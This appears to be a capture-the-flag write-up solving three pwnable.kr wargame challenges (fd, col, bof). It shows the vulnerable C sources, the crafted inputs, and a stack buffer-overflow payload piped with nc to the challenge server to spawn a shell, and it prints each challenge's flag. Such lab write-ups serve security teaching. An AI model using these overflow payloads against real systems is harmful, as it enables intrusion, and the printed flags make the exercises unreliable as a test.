# fd
>Mommy! what is a file descriptor in Linux?<br><br>* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU<br><br>ssh fd@pwnable.kr -p2222 (pw:guest)

Let's look at `fd.c`:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

Pass in 0x1234 (4660) as input so that fd = 0 (so the program reads from STDIN). Then type "LETMEWIN", press enter, and get the flag.

flag: `mommy! I think I know what a file descriptor is!!`

# col

`col.c`:
```
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```

We have to input a string that's 20 bytes, then the check_password function takes every 4 bytes as an int (the function takes the char pointer to our input and casts it to a int pointer and because ints are 4 bytes in c when we dereference the pointer we are getting 4 bytes of our string as opposed to just one if we have a char pointer) and adds all of the ints up and if it equals 0x21DD09EC we get the flag. We can't use \x00 or null bytes because then strlen will calculate our string input wrong cause null bytes will make our string appear "terminated". 

Running the following command will get us the flag: `./col \`python -c 'print "\xe8\x05\xd9\x1d"+"\x01"*16'\``

flag: daddy! I just managed to create a hash collision :)

bof

bof.c:
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

Classic buffer overflow question. In the assembly we see that $ebp-0x2c is set for the buffer, and it checks if $ebp + 0x8 == 0xcafebabe. So what we do is we set 52 A's, then have our 0xcafebabe. We accomplish this with the following payload: python -c "print 'A'*52+'\xbe\xba\xfe\xca'". However, it seems the program checks for stack smashing, so what we need to do is keep STDIN open once we get our shell, cause the program only checks for stack smashing when at the end of the func function. So we modify our payload: (python -c "print 'A'*52+'\xbe\xba\xfe\xca'"; cat). We run (python -c "print 'A'*52+'\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000 and then run ls, see the flag file, and run cat flag, and get our flag.

flag: daddy, I just pwned a buFFer :)





